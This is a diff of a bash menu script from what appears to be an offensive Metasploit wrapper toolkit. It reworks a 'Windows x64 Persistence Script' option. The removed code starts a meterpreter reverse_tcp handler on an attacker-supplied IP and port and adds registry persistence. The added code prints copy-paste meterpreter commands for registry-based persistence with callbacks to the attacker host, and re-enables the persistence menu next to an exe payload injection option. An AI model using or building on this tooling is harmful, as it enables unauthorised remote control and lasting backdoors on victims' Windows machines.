@@ -534,28 +534,20 @@ persist() {
     locals
     case $opt in
         1)
-            echo "          ${FGC}    Forging a Windows Persistence Script:${NC}${YELLOW}"
+            echo "          ${FGC}    Forging a Windows x64 Persistence Script:${NC}${YELLOW}"
             echo
             read -p '        Set Attacker IP: ' attackerip
             read -p '        Set Attacker Port: ' attackerport
-            read -p '        Set Callback Interval: ' attinterval
+            read -p '        Set Session ID: ' session
             echo
-            echo "          --> Starting Metasploit..."
-            xterm -e msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
-            sleep 5 # Give Metasploit some time to start
-
-            # Check for an active session
-            SESSION_ID=$(msfconsole sessions -l | grep 'Id' | awk '{print $1}')
-            if [ -n "$SESSION_ID" ]; then
-                echo "Session $SESSION_ID is active. Adding persistence..."
-                msfconsole -q -x "use exploit/windows/x64/local/registry_persistence; set session $SESSION_ID; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
-                sleep 5 # Give Metasploit some time to add persistence
-                echo
-                echo "Persistence added!"
-            else
-                echo "No active session found. Persistence cannot be added."
-            fi
-
+            echo "  Once you have a connection, and have the meterpreter prompt, type (or copy/paste):" | fmt -w 60
+            echo
+            echo "  ${FGC}${LIGHT_CYAN} run exploit/windows/local/registry_persistence LHOST=$attackerip LPORT=$attackerport SESSION=$session ${NC}${YELLOW}"
+            echo
+            echo "  *** In older msfconsole versions, instead type (or copy/paste)" | fmt -w 60
+            echo
+            echo "  ${FGC}${LIGHT_CYAN} run persistence -x -i 20 -r $attackerip -p $attackerport ${NC}${YELLOW}"
+            echo
             pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto stay
             ;;
@@ -796,8 +788,8 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    💉${GREEN} 3 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-#   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
-#   echo "	  |---------------------------------------------|"
+   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
@@ -815,8 +807,8 @@ function pause(){
          ;;
        3) malexe
          ;;
-       #4) persist
-       #  ;;
+       4) persist
+         ;;
        M) mfconsole
          ;;
        q)
